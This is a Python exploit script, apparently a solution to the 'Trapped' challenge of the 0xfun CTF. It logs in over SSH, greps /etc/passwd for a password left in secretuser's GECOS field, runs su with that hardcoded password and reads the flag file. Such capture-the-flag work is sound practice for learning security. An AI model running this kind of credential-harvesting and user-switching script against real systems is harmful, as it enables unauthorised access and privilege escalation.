#!/usr/bin/env python3
"""
Trapped - 0xfun CTF
ACL bypass via password in GECOS field
"""

import paramiko
import time
import sys

# === CONFIGURACIÓN ===
HOST = "chall.0xfun.org"
PORT = 62879
USERNAME = "trapped"
PASSWORD = "password"
SECRETUSER_PASSWORD = "Unc0ntr0lled1234Passw0rd"

def exploit():
    """Conecta, cambia a secretuser, y lee el flag"""

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[*] Connecting to {HOST}:{PORT}...")
        client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, timeout=10)
        print("[+] Connected successfully!")

        # Verificar ACLs
        print("\n[*] Checking ACLs on flag.txt...")
        stdin, stdout, stderr = client.exec_command('getfacl flag.txt 2>&1')
        print(stdout.read().decode())

        # Verificar GECOS field
        print("[*] Checking /etc/passwd for password leak...")
        stdin, stdout, stderr = client.exec_command('cat /etc/passwd | grep secretuser')
        passwd_line = stdout.read().decode().strip()
        print(f"[+] Found: {passwd_line}")

        # Usar shell interactivo para su
        print("\n[*] Switching to secretuser...")
        channel = client.invoke_shell()
        time.sleep(1)
        channel.recv(4096)  # Clear initial output

        # su a secretuser
        channel.send('su secretuser\n')
        time.sleep(1)
        channel.recv(4096)  # Consume password prompt

        # Enviar contraseña
        channel.send(f'{SECRETUSER_PASSWORD}\n')
        time.sleep(1)
        channel.recv(4096)  # Consume prompt

        # Verificar usuario actual
        channel.send('whoami\n')
        time.sleep(0.5)
        output = channel.recv(4096).decode()
        if 'secretuser' in output:
            print("[+] Successfully switched to secretuser!")
        else:
            print("[-] Failed to switch user")
            return

        # Leer el flag
        print("\n[*] Reading flag...")
        channel.send('cat /home/trapped/flag.txt\n')
        time.sleep(0.5)
        output = channel.recv(4096).decode()

        # Extraer flag
        for line in output.split('\n'):
            if '0xfun{' in line:
                print("\n" + "="*60)
                print(f"[+] FLAG: {line.strip()}")
                print("="*60)
                break

        channel.close()
        client.close()

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    exploit()
